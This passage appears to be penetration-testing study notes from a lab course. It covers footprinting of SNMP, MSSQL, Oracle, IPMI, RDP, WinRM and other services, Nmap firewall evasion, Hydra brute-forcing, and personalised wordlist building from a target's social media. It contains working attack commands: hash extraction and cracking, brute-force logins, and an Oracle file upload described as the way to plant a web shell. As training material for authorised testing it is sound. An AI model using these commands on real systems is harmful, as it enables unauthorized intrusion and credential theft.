<h5 id="snmp-versions-1"><a class="header" href="#snmp-versions-1">SNMP Versions</a></h5>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Version</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>SNMPv1</td><td>- no built-in authentication<br>- does not support encryption</td></tr>
<tr><td>SNMPv2c</td><td>- does not use passwords, it uses community<br>strings as an authentication method<br>- does not support encryption</td></tr>
<tr><td>SNMPv3</td><td>- authentication using username and password<br>- supports encryption<br>- complex compared to the previous versions</td></tr>
</tbody>
</table>
</div>
<h5 id="footprinting-1"><a class="header" href="#footprinting-1">Footprinting</a></h5>
<p>Tools:</p>
<ul>
<li>snmpwalk -&gt; query the OIDs with their information (once we know the snmp version that is running on the server)</li>
</ul>
<pre><code>snmpwalk -v2c -c public 10.129.14.128
</code></pre>
<ul>
<li>onesixtyone -&gt; brute-force the names of the community strings</li>
</ul>
<pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
</code></pre>
<p>In this case <code>backup</code> is the community string</p>
<ul>
<li>braa
Once we know a community string, we can use it with <a href="https://github.com/mteg/braa">braa</a> to brute-force the individual OIDs and enumerate the information behind them.</li>
</ul>
<h4 id="mysql-1"><a class="header" href="#mysql-1">mysql</a></h4>
<h5 id="footprinting-2"><a class="header" href="#footprinting-2">Footprinting</a></h5>
<ul>
<li>scanning</li>
</ul>
<pre><code>sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
</code></pre>
<ul>
<li>interacting with the database</li>
</ul>
<p>The most important databases for the MySQL server are the <code>system schema</code> (sys) and <code>information schema</code> (information_schema).
The system schema contains tables, information, and metadata necessary for management.</p>
<pre><code>use sys;
show tables;
select host, unique_users from host_summary;
</code></pre>
<h4 id="mssql-1"><a class="header" href="#mssql-1">MSSQL</a></h4>
<p>mssql (TCP 1433)</p>
<h5 id="footprinting-3"><a class="header" href="#footprinting-3">Footprinting</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
</code></pre>
<ul>
<li>MSSQL Ping in Metasploit</li>
</ul>
<pre><code>use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 10.129.201.248
run
</code></pre>
<ul>
<li>Connecting with Mssqlclient.py</li>
</ul>
<pre><code>python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
</code></pre>
<ul>
<li>Connecting with sqsh</li>
</ul>
<pre><code class="language-shell-session">sqsh -S 10.129.20.13 -U username -P Password123
</code></pre>
<ul>
<li>Connecting from windows host</li>
</ul>
<pre><code class="language-cmd-session">C:&gt; sqlcmd -S 10.129.20.13 -U username -P Password123
</code></pre>
<p>MSSQL uses T-SQL so the syntax is different from mysql
here‚Äôs how to list all available databases (you should compare the results with the default databases list shown above)</p>
<pre><code>select name from sys.databases
</code></pre>
<h4 id="oracle-tns-1"><a class="header" href="#oracle-tns-1">Oracle TNS</a></h4>
<p>The <code>Oracle Transparent Network Substrate</code> (<code>TNS</code>) server is a communication protocol that facilitates communication between Oracle databases and applications over networks</p>
<p>By default, the listener listens for incoming connections on the <code>TCP/1521</code> port</p>
<h5 id="footprinting-4"><a class="header" href="#footprinting-4">Footprinting</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>sudo nmap -p1521 -sV 10.129.204.235 --open
</code></pre>
<p>A System Identifier (<code>SID</code>) is a unique name that identifies a particular database instance</p>
<ul>
<li>Nmap - SID Bruteforcing</li>
</ul>
<pre><code>sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
</code></pre>
<ul>
<li>ODAT</li>
</ul>
<pre><code>odat all -s 10.129.204.235
</code></pre>
<ul>
<li>SQLplus - Log In</li>
</ul>
<pre><code>sqlplus scott/tiger@10.129.204.235/XE
</code></pre>
<ul>
<li>Oracle RDBMS - Interaction</li>
</ul>
<pre><code>select table_name from all_tables;
select * from user_role_privs;
</code></pre>
<ul>
<li>Oracle RDBMS - Database Enumeration
This is possible if the user has sysdba privilege</li>
</ul>
<pre><code class="language-shell-session">sqlplus scott/tiger@10.129.204.235/XE as sysdba
select * from user_role_privs;
</code></pre>
<ul>
<li>Oracle RDBMS - Extract Password Hashes</li>
</ul>
<pre><code>select name, password from sys.user$;
</code></pre>
<ul>
<li>Oracle RDBMS - File Upload (WEB)
On Windows:</li>
</ul>
<pre><code>echo "Oracle File Upload Test" &gt; testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
</code></pre>
<p>On Linux:</p>
<pre><code>echo "Oracle File Upload Test" &gt; testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile /var/www/html testing.txt ./testing.txt
</code></pre>
<p>Finally, we can test if the file upload approach worked with <code>curl</code>. Therefore, we will use a <code>GET http://&lt;IP&gt;</code> request, or we can visit via browser.</p>
<pre><code class="language-shell-session">curl -X GET http://10.129.204.235/testing.txt
</code></pre>
<p>if this worked then we can upload a web shell to the target</p>
<h4 id="ipmi-1"><a class="header" href="#ipmi-1">IPMI</a></h4>
<p><a href="https://www.thomas-krenn.com/en/wiki/IPMI_Basics">Intelligent Platform Management Interface</a> IPMI (UDP 623)
IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system‚Äôs hardware and does not require access to the operating system via a login shell</p>
<h5 id="baseboard-management-controller-bmc"><a class="header" href="#baseboard-management-controller-bmc">Baseboard Management Controller (BMC)</a></h5>
<ul>
<li>A micro-controller and essential component of an IPMI.</li>
<li>The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI.</li>
<li>If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system.</li>
<li>Gaining access to a BMC is nearly equivalent to physical access to a system.</li>
<li>Many BMCs expose a web-based management console.</li>
</ul>
<h5 id="footprinting-5"><a class="header" href="#footprinting-5">Footprinting</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
</code></pre>
<ul>
<li>Metasploit Version Scan</li>
</ul>
<pre><code>use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
run
</code></pre>
<ul>
<li>Default passwords</li>
</ul>
<p>When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>
<ul>
<li>Dangerous settings
If default credentials do not work to access a BMC, we can turn to a <a href="http://fish2.com/ipmi/remote-pw-cracking.html">flaw</a> in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user‚Äôs password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC.</li>
</ul>
<p>These password hashes can then be cracked offline using a dictionary attack using <code>Hashcat</code> mode <code>7300</code>. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command <code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code> which tries all combinations of upper case letters and numbers for an eight-character password.</p>
<ul>
<li>Metasploit Dumping Hashes</li>
</ul>
<pre><code class="language-shell-session">use auxiliary/scanner/ipmi/ipmi_dumphashes
set OUTPUT_JOHN_FILE hashes.john
set rhosts 10.129.42.195
run
</code></pre>
<ul>
<li>cracking hashes
once we retrieve the hashes returned by metasploit we can crack those using john</li>
</ul>
<pre><code>/usr/sbin/john \  john \
    --fork=15 \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --format=rakp \
    --session=ipmi \
    hashes.john
</code></pre>
<h4 id="ssh-1"><a class="header" href="#ssh-1">SSH</a></h4>
<p>ssh (TCP 22)</p>
<h5 id="footprinting-6"><a class="header" href="#footprinting-6">Footprinting</a></h5>
<pre><code>ssh-audit.py 10.129.14.132
</code></pre>
<p>Allowing password authentication allows us to brute-force a known username for possible passwords</p>
<h4 id="rsync"><a class="header" href="#rsync">Rsync</a></h4>
<p><a href="https://linux.die.net/man/1/rsync">Rsync</a> is a fast and efficient tool for locally and remotely copying files. (By default, it uses port TCP <code>873</code>)</p>
<p>Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.</p>
<h5 id="probing-for-accessible-shares"><a class="header" href="#probing-for-accessible-shares">Probing for Accessible Shares</a></h5>
<pre><code>nc -nv 127.0.0.1 873
</code></pre>
<p>then</p>
<pre><code>#list
</code></pre>
<p>We do this to list shares</p>
<h5 id="enumerating-an-open-share"><a class="header" href="#enumerating-an-open-share">Enumerating an Open Share</a></h5>
<pre><code>rsync -av --list-only rsync://127.0.0.1/dev
</code></pre>
<p>If Rsync is configured to use SSH to transfer files, we could modify our commands to include the <code>-e ssh</code> flag, or <code>-e "ssh -p2222"</code> if a non-standard port is in use for SSH</p>
<h4 id="r-services"><a class="header" href="#r-services">R-Services</a></h4>
<ul>
<li>R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP.</li>
<li><code>r-services</code> were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (<code>SSH</code>) protocols and commands due to inherent security flaws built into them</li>
<li>Much like <code>telnet</code>, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (<code>MITM</code>) attacks.</li>
</ul>
<p><code>R-services</code> span across the ports <code>512</code>, <code>513</code>, and <code>514</code> and are only accessible through a suite of programs known as <code>r-commands</code>.</p>
<ul>
<li>
<p>R-Services Commands</p>
</li>
<li>
<p>Scanning for R-Services</p>
</li>
</ul>
<pre><code class="language-shell-session">sudo nmap -sV -p 512,513,514 10.0.17.2
</code></pre>
<ul>
<li>Logging in Using Rlogin</li>
</ul>
<pre><code class="language-shell-session">rlogin 10.0.17.2 -l htb-student
</code></pre>
<ul>
<li>Listing Authenticated Users Using Rwho</li>
</ul>
<pre><code>rwho
</code></pre>
<ul>
<li>Listing Authenticated Users Using Rusers
This will give us more information</li>
</ul>
<pre><code>rusers -al 10.0.17.5
</code></pre>
<h4 id="rdp"><a class="header" href="#rdp">RDP</a></h4>
<p>The <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">Remote Desktop Protocol</a> (<code>RDP</code>) is a protocol developed by Microsoft.</p>
<p>typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.</p>
<h5 id="footprinting-7"><a class="header" href="#footprinting-7">Footprinting</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
</code></pre>
<ul>
<li>Initiate an RDP Session</li>
</ul>
<pre><code>xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
</code></pre>
<h4 id="winrm"><a class="header" href="#winrm">WinRM</a></h4>
<p>The Windows Remote Management (<code>WinRM</code>) is a simple Windows integrated remote management protocol based on the command line.
WinRM uses the Simple Object Access Protocol (<code>SOAP</code>) to establish connections to remote hosts and their applications.</p>
<p>WinRM relies on <code>TCP</code> ports <code>5985</code> and <code>5986</code> for communication, with the last port <code>5986 using HTTPS</code></p>
<h5 id="footprinting-8"><a class="header" href="#footprinting-8">Footprinting</a></h5>
<ul>
<li>Nmap</li>
</ul>
<pre><code>nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
</code></pre>
<ul>
<li>Interacting with WinRM</li>
</ul>
<pre><code>evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
</code></pre>
<h4 id="wmi"><a class="header" href="#wmi">WMI</a></h4>
<ul>
<li>Windows Management Instrumentation (<code>WMI</code>) allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment.</li>
<li>WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (<code>WMIC</code>). WMI is not a single program but consists of several programs and various databases, also known as repositories.</li>
</ul>
<h5 id="footprinting-the-service-4"><a class="header" href="#footprinting-the-service-4">Footprinting the Service</a></h5>
<p>The initialization of the WMI communication always takes place on <code>TCP</code> port <code>135</code>, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a> from the Impacket toolkit can be used for this.</p>
<pre><code>wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
</code></pre>
<h2 id="introduction-to-nmap"><a class="header" href="#introduction-to-nmap">Introduction to Nmap</a></h2>
<p>There are many scanning types that can be done with nmap</p>
<pre><code>SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags &lt;flags&gt;: Customize TCP scan flags
  -sI &lt;zombie host[:probeport]&gt;: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b &lt;FTP relay host&gt;: FTP bounce scan
</code></pre>
<p>The TCP SYN scan is the default:
<em>Quick overview</em>
Our machine first sends a TCP SYN segment</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Response</th><th>Explanation</th></tr>
</thead>
<tbody>
<tr><td>SYN-ACK</td><td>If our target sends an <code>SYN-ACK</code> flagged packet back to the scanned port, Nmap detects that the port is open</td></tr>
<tr><td>RST</td><td>If the packet receives an <code>RST</code> flag, it is an indicator that the port is <code>closed</code></td></tr>
<tr><td>nothing</td><td>If Nmap does not receive a packet back, it will display it as <code>filtered</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="host-discovery"><a class="header" href="#host-discovery">Host Discovery</a></h2>
<h3 id="scan-network-range"><a class="header" href="#scan-network-range">Scan network range</a></h3>
<p>Discovering online systems (ping sweep)</p>
<pre><code>sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
</code></pre>
<h3 id="scan-a-list-of-ips"><a class="header" href="#scan-a-list-of-ips">Scan a list of IPs</a></h3>
<p>In case we have a list of IP addresses in a file we can scan those by giving the file to nmap</p>
<pre><code>sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
</code></pre>
<hr>
<h2 id="host-and-port-scanning"><a class="header" href="#host-and-port-scanning">Host and Port Scanning</a></h2>
<h3 id="scanning-the-top-100-ports"><a class="header" href="#scanning-the-top-100-ports">scanning the top 100 ports</a></h3>
<pre><code>sudo nmap 10.129.2.28 --top-ports=100
</code></pre>
<p>or</p>
<pre><code>sudo nmap -F 10.129.2.28
</code></pre>
<h3 id="scanning-all-ports"><a class="header" href="#scanning-all-ports">scanning all ports</a></h3>
<pre><code>sudo nmap 10.129.2.28 -p-
</code></pre>
<h3 id="scanning-a-port-range"><a class="header" href="#scanning-a-port-range">scanning a port range</a></h3>
<pre><code>sudo nmap 10.129.2.28 -p22-445
</code></pre>
<h3 id="udp-scan"><a class="header" href="#udp-scan">UDP scan</a></h3>
<pre><code>sudo nmap -F -sU 10.129.2.28
</code></pre>
<hr>
<h2 id="service-enumeration-1"><a class="header" href="#service-enumeration-1">Service enumeration</a></h2>
<h3 id="banner-grabbing"><a class="header" href="#banner-grabbing">Banner grabbing</a></h3>
<pre><code>nc -nv 10.129.2.28 25
</code></pre>
<hr>
<h2 id="firewall-and-idsips-evasion"><a class="header" href="#firewall-and-idsips-evasion">Firewall and IDS/IPS Evasion</a></h2>
<p>When a port is shown as filtered, it can have several reasons. In most cases, firewalls have certain rules set to handle specific connections.</p>
<h3 id="determine-firewalls-and-their-rules-ack-scan"><a class="header" href="#determine-firewalls-and-their-rules-ack-scan">Determine Firewalls and Their Rules ACK scan</a></h3>
<p>Firewalls and IDS/IPS systems typically block incoming SYN packets making the usual SYN (-sS) and connect (-sT) scans ineffective.
Thus using an <strong>ACK scan</strong> (-sA) might be a good idea because the firewall cannot determine whether the connection was first established from the external network or the internal network.</p>
<p>(You should also enable the ‚Äìpacket-trace option, read the SA R S or A in that section)</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>R</th><th>RESET</th></tr>
</thead>
<tbody>
<tr><td>SA</td><td>SYN-ACK</td></tr>
<tr><td>S</td><td>SYN</td></tr>
<tr><td>A</td><td>ACK</td></tr>
</tbody>
</table>
</div>
<h3 id="scan-by-using-different-source-ip"><a class="header" href="#scan-by-using-different-source-ip">Scan by using different source ip</a></h3>
<pre><code>sudo nmap 10.129.2.28 -n -Pn -p445 -S 10.129.2.200 -e tun0
</code></pre>
<h3 id="dns-proxying"><a class="header" href="#dns-proxying">DNS Proxying</a></h3>
<h4 id="syn-scan-from-dns-port"><a class="header" href="#syn-scan-from-dns-port">SYN-Scan from DNS port</a></h4>
<p>If a port comes up as <code>filtered</code>, you can try to scan it using 53 (DNS) as a source port number</p>
<pre><code>sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
</code></pre>
<p>If it‚Äôs now shown as open then you can connect (once again using 53 as a source port number)</p>
<pre><code>nc -nv --source-port 53 10.129.2.28 50000
</code></pre>
<hr>
<h2 id="references-2"><a class="header" href="#references-2">References</a></h2>
<ul>
<li><a href="https://nmap.org/book/man-port-scanning-techniques.html">Nmap scan types</a></li>
<li><a href="https://www.nmap.org">nmap docs</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hydra-1"><a class="header" href="#hydra-1">Hydra</a></h1>
<h2 id="hydra-1-1"><a class="header" href="#hydra-1-1">Hydra</a></h2>
<p>Syntax:</p>
<pre><code class="language-shell-session">hydra [login_options] [password_options] [attack_options] [service_options]
</code></pre>
<p>Example (without example):</p>
<pre><code>hydra -l admin -P /path/to/password_list.txt 192.168.1.100 ftp
</code></pre>
<p>Example (with example):</p>
<pre><code>hydra http-get://example.com/login.php -m "POST:user=^USER^&amp;pass=^PASS^"
</code></pre>
<h3 id="brute-forcing-a-web-login-form"><a class="header" href="#brute-forcing-a-web-login-form">Brute-Forcing a Web Login Form</a></h3>
<p>Suppose you are tasked with brute-forcing a login form on a web application at <code>www.example.com</code>. You know the username is ‚Äúadmin,‚Äù and the form parameters for the login are <code>user=^USER^&amp;pass=^PASS^</code>. To perform this attack, use the following Hydra command:</p>
<pre><code class="language-shell-session">hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&amp;pass=^PASS^:S=302"
</code></pre>
<p>This command instructs Hydra to:</p>
<ul>
<li>Use the username ‚Äúadmin‚Äù.</li>
<li>Use the list of passwords from the <code>passwords.txt</code> file.</li>
<li>Target the login form at /login on <code>www.example.com</code></li>
<li>Employ the http-post-form module with the specified form parameters.</li>
<li>Look for a successful login indicated by the HTTP status code 302.</li>
</ul>
<h3 id="advanced-rdp-brute-forcing"><a class="header" href="#advanced-rdp-brute-forcing">Advanced RDP Brute-Forcing</a></h3>
<p>Now, imagine you‚Äôre testing a Remote Desktop Protocol (RDP) service on a server with IP <code>192.168.1.100</code>. You suspect the username is ‚Äúadministrator,‚Äù and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:</p>
<pre><code class="language-shell-session">hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
</code></pre>
<h2 id="basic-http-authentication"><a class="header" href="#basic-http-authentication">Basic HTTP Authentication</a></h2>
<h3 id="basic-http-authentication-1"><a class="header" href="#basic-http-authentication-1">Basic HTTP Authentication</a></h3>
<p>In essence, Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a <code>401 Unauthorized</code> status and a <code>WWW-Authenticate</code> header prompting the user‚Äôs browser to present a login dialog.</p>
<p>Once the user provides their username and password, the browser concatenates them into a single string, separated by a colon. This string is then encoded using Base64 and included in the <code>Authorization</code> header of subsequent requests, following the format <code>Basic &lt;encoded_credentials&gt;</code>. The server decodes the credentials, verifies them against its database, and grants or denies access accordingly.</p>
<pre><code class="language-http">GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
</code></pre>
<h3 id="exploiting-basic-auth-with-hydra"><a class="header" href="#exploiting-basic-auth-with-hydra">Exploiting Basic Auth with Hydra</a></h3>
<pre><code class="language-shell-session">hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
</code></pre>
<ul>
<li><code>-l basic-auth-user</code>: This specifies that the username for the login attempt is ‚Äòbasic-auth-user‚Äô.</li>
<li><code>-P 2023-200_most_used_passwords.txt</code>: This indicates that Hydra should use the password list contained in the file ‚Äò2023-200_most_used_passwords.txt‚Äô for its brute-force attack.</li>
<li><code>127.0.0.1</code>: This is the target IP address, in this case, the local machine (localhost).</li>
<li><code>http-get /</code>: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path (‚Äò/‚Äô).</li>
<li><code>-s 81</code>: This overrides the default port for the HTTP service and sets it to 81.</li>
</ul>
<h2 id="login-forms"><a class="header" href="#login-forms">Login Forms</a></h2>
<p>After analyzing the login form‚Äôs structure and behavior, it‚Äôs time to build the <code>params</code> string, a critical component of Hydra‚Äôs http-post-form attack module. This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.</p>
<p>The <code>params</code> string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.</p>
<ul>
<li><code>Form Parameters</code>: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (<code>^USER^</code> and <code>^PASS^</code>) within these parameters with values from your wordlists.</li>
<li><code>Additional Fields</code>: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the <code>params</code> string. These can have static values or dynamic placeholders if their values change with each request.</li>
<li><code>Success Condition</code>: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like <code>S=302</code> for a redirect) or the presence or absence of specific text in the server‚Äôs response (e.g., <code>F=Invalid credentials</code> or <code>S=Welcome</code>).</li>
</ul>
<p>Let‚Äôs apply this to our scenario. We‚Äôve discovered:</p>
<ul>
<li>The form submits data to the root path (<code>/</code>).</li>
<li>The username field is named <code>username</code>.</li>
<li>The password field is named <code>password</code>.</li>
<li>An error message ‚ÄúInvalid credentials‚Äù is displayed upon failed login.</li>
</ul>
<p>Therefore, our <code>params</code> string would be:</p>
<pre><code>/:username=^USER^&amp;password=^PASS^:F=Invalid credentials
</code></pre>
<pre><code class="language-shell-session">hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -s 5000 http-post-form "/:username=^USER^&amp;password=^PASS^:F=Invalid credentials"
</code></pre>
<hr>
<h1 id="custom-wordlists"><a class="header" href="#custom-wordlists">Custom Wordlists</a></h1>
<h2 id="username-anarchy"><a class="header" href="#username-anarchy">Username Anarchy</a></h2>
<p>Even when dealing with a seemingly simple name like ‚ÄúJane Smith,‚Äù manual username generation can quickly become a convoluted endeavor. While the obvious combinations like <code>jane</code>, <code>smith</code>, <code>janesmith</code>, <code>j.smith</code>, or <code>jane.s</code> may seem adequate, they barely scratch the surface of the potential username landscape.</p>
<p>This is where <code>Username Anarchy</code> shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target‚Äôs username:</p>
<pre><code class="language-shell-session">./username-anarchy Jane Smith &gt; jane_smith_usernames.txt
</code></pre>
<h2 id="cupp"><a class="header" href="#cupp">CUPP</a></h2>
<p>With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where <code>CUPP</code> (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.</p>
<p>Let‚Äôs continue our exploration with Jane Smith. We‚Äôve already employed <code>Username Anarchy</code> to generate a list of potential usernames. Now, let‚Äôs use CUPP to complement this with a targeted password list.</p>
<p>The efficacy of CUPP hinges on the quality and depth of the information you feed it. It‚Äôs akin to a detective piecing together a suspect‚Äôs profile - the more clues you have, the clearer the picture becomes. So, where can one gather this valuable intelligence for a target like Jane Smith?</p>
<ul>
<li><code>Social Media</code>: A goldmine of personal details: birthdays, pet names, favorite quotes, travel destinations, significant others, and more. Platforms like Facebook, Twitter, Instagram, and LinkedIn can reveal much information.</li>
<li><code>Company Websites</code>: Jane‚Äôs current or past employers‚Äô websites might list her name, position, and even her professional bio, offering insights into her work life.</li>
<li><code>Public Records</code>: Depending on jurisdiction and privacy laws, public records might divulge details about Jane‚Äôs address, family members, property ownership, or even past legal entanglements.</li>
<li><code>News Articles and Blogs</code>: Has Jane been featured in any news articles or blog posts? These could shed light on her interests, achievements, or affiliations.</li>
</ul>
<p>CUPP will then take your inputs and create a comprehensive list of potential passwords:</p>
<ul>
<li>Original and Capitalized: <code>jane</code>, <code>Jane</code></li>
<li>Reversed Strings: <code>enaj</code>, <code>enaJ</code></li>
<li>Birthdate Variations: <code>jane1994</code>, <code>smith2708</code></li>
<li>Concatenations: <code>janesmith</code>, <code>smithjane</code></li>
<li>Appending Special Characters: <code>jane!</code>, <code>smith@</code></li>
<li>Appending Numbers: <code>jane123</code>, <code>smith2024</code></li>
<li>Leetspeak Substitutions: <code>j4n3</code>, <code>5m1th</code></li>
<li>Combined Mutations: <code>Jane1994!</code>, <code>smith2708@</code></li>
</ul>
<pre><code class="language-shell-session">cupp -i
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cve-common-vulnerabilities-and-exposures"><a class="header" href="#cve-common-vulnerabilities-and-exposures">CVE (Common Vulnerabilities and Exposures)</a></h1>
<p>CVE is a publically available catalog of security issues sponsored by the United States Department of Homeland Security (DHS).</p>
<h1 id="oval-open-vulnerability-and-assessment-language"><a class="header" href="#oval-open-vulnerability-and-assessment-language">OVAL (Open Vulnerability and Assessment Language)</a></h1>
<ul>
<li>OVAL is an international, community-driven effort to standardize how to assess and report upon the machine state of computer systems. It includes a language for specifying system details, a method for evaluating those details, and a reporting format for the results. OVAL provides a language for encoding system attributes and various types of content within the security community.</li>
<li>The OVAL repo has over 7000 definitions for public use.</li>
<li>The goal of the OVAL process is to have a 3 step structure during the assessment process:
<ol>
<li>Identify a systems‚Äô configuration for testing</li>
<li>Evaulate the current systems‚Äô state</li>
<li>Disclose the information in a report</li>
</ol>
</li>
<li>OVAL definitions are recorded in XML</li>
<li>The four main classes of OVAL definitions consist of:
<ol>
<li>Vulnerability Definitions</li>
<li>Compliance Definitions</li>
<li>Inventory Definitions</li>
<li>Patch Definitions</li>
</ol>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cvss-common-vulnerability-scoring-system"><a class="header" href="#cvss-common-vulnerability-scoring-system">CVSS (Common Vulnerability Scoring System)</a></h1>
<p>The Common Vulnerability Scoring System (CVSS) is a standardized framework for rating the severity of security vulnerabilities in software and hardware systems. It provides a numerical score that reflects the potential impact of a vulnerability, helping organizations prioritize their response and remediation efforts.</p>
<p><img src="infosec/images/cvss_scoring.png" alt=""></p>
<h2 id="cvss-impact-metrics"><a class="header" href="#cvss-impact-metrics">CVSS Impact Metrics</a></h2>
<p>CVSS scores are calculated based on a set of metrics that assess various aspects of a vulnerability. These metrics are divided into three groups:</p>
<ol>
<li>
<p><strong>Base Metrics</strong>: These metrics represent the intrinsic characteristics of a vulnerability that are constant over time and across user environments. They include:</p>
<ul>
<li>Attack Vector (AV)</li>
<li>Attack Complexity (AC)</li>
<li>Privileges Required (PR)</li>
<li>User Interaction (UI)</li>
<li>Scope (S)</li>
<li>Confidentiality Impact (C)</li>
<li>Integrity Impact (I)</li>
<li>Availability Impact (A)</li>
</ul>
</li>
<li>
<p><strong>Temporal Metrics</strong>: These metrics reflect characteristics of a vulnerability that may change over time but not across user environments. They include:</p>
<ul>
<li>Exploit Code Maturity (E) - The probabilty of the vulnerability being exploited based on ease of exploitation.</li>
<li>Remediation Level (RL) - The level of remediation available for the vulnerability.
<ul>
<li>Official Fix: An official patch or update is available.</li>
<li>Temporary Fix: A temporary workaround is available.</li>
<li>Workaround: A non-official workaround is available.</li>
<li>Unavailable: No remediation is available.</li>
<li>Not defined: No information is available about remediation.</li>
</ul>
</li>
<li>Report Confidence (RC) - The degree of confidence in the existence of the vulnerability.
<ul>
<li>Confirmed: The vulnerability has been confirmed by multiple sources.</li>
<li>Reasonable: The vulnerability is likely to exist based on available evidence.</li>
<li>Unknown: There is insufficient information to determine the existence of the vulnerability.</li>
<li>Not defined: No information is available about the vulnerability.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Environmental Metrics</strong>: This metric group represents the significance of the vulnerability to an organization</p>
<ul>
<li>Modified Base Metrics - Represents the metrics that can be altered if the organization deems it is a more significant risk.
<ul>
<li>Not Defined: The metric is not defined and the base metric value is used.</li>
<li>Low: The vulnerability would have a low impact to one of the elements of the CIA triad for the organization.</li>
<li>Medium:  The vulnerability would have a medium impact to one of the elements of the CIA triad for the organization.</li>
<li>High: The vulnerability would have a high impact to one of the elements of the CIA triad for the organization.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="cvss-score-calculation"><a class="header" href="#cvss-score-calculation">CVSS Score Calculation</a></h3>
<ul>
